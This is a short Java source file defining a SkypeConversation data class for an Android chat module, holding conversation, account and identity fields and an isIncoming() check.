package com.android.networking.module.chat;

public class SkypeConversation {

	public String conversation;
	public long lastReadIndex;
	protected String account;
	protected int id;
	protected String identity;
	protected String displayname;
	protected String given;
	protected String inbox;
	public boolean incoming;
	public boolean isIncoming() {
		return !account.equals(identity);
	}

}
